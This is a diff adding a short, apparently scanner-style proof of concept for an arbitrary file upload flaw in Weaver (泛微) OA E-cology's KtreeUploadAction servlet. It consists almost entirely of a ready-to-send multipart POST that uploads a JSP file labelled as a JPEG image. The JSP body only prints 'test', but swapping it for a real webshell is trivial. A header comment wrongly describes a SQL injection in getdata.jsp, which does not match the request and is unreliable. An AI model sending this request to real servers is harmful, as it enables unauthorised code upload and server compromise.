@@ -1,0 +1,16 @@
+# 泛微OA E-cology KtreeUploadAction 任意文件上传漏洞
+# 泛微OA V8 getdata.jsp 存在SQL注入漏洞，攻击者可通过该漏洞上传恶意文件控制服务器
+POST /weaver/com.weaver.formmodel.apps.ktree.servlet.KtreeUploadAction?action=image&acid=80025431&bid=hd_tag_m8mv25zq HTTP/1.1
+Host: www.swaf.com
+RM-PRO-BusinessID: hd_tag_m8mv25zq
+RM-PRO-Token: 615178ccd3ada1c385a52357f247dbc8
+RM-PRO-Time: 1742808517613
+User-Agent: curl/7.83.1
+Content-Type: multipart/form-data; boundary=--------1638451160
+
+----------1638451160
+Content-Disposition: form-data; name="test"; filename="test.jsp"
+Content-Type: image/jpeg
+
+<% out.println("test");%>
+----------1638451160--
